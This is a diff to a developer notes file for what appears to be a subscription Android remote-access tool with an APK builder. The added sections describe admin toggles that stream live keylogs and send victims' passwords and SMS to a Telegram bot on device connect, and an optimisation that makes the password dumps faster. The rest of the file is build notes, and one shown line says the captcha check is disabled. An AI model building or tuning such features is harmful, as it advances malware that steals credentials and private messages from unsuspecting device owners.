@@ -13,6 +13,12 @@ Disabled. `backend/utils/captcha.js → verifyCaptcha()` short-circuits to `retu
 ## Build start guards (front-end)
 `react-dashboard/src/components/BuildApkTab.jsx` uses `submitting` state + optimistic `setRunning(true)` on click. The "Build APK" button is disabled when `running || submitting || !accessId`, label flips to "Starting…" / "Building…". Server-side `POST /api/build/apk` already returns 409 on duplicate per accessId, so the user cannot stop/restart an in-flight job.
 
+## Admin Telegram settings persistence
+Admin-side Telegram toggles (Stream Live Keylogger, Send Passwords on Connect, Send SMS on Connect, etc.) are written to `backend/.admin-telegram-settings.json` on every save and loaded back at boot. This survives restarts and redeploys. Env vars (`TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`) still take priority over the file for credentials. User-side toggles are stored in MongoDB as before.
+
+## Password dump speed
+At connect time a single `get_keylogs` call is made (not two). `_doAutoPasswords` in the connect handler fetches keylogs once, populates `devicePasswords` in-memory cache, marks the sync done (so `_autoSyncDevice` skips the redundant second fetch), then passes the already-fetched array to `_autoSendPasswordsToTelegram` via the new `preloadedAll` parameter — eliminating the extra round-trip that made password dumps slow compared to SMS dumps.
+
 ## Key code paths
 - `backend/server.js` — main API, SSE, device TCP server.
 - `backend/models/User.js` — user model with trial + paid subscription fields.
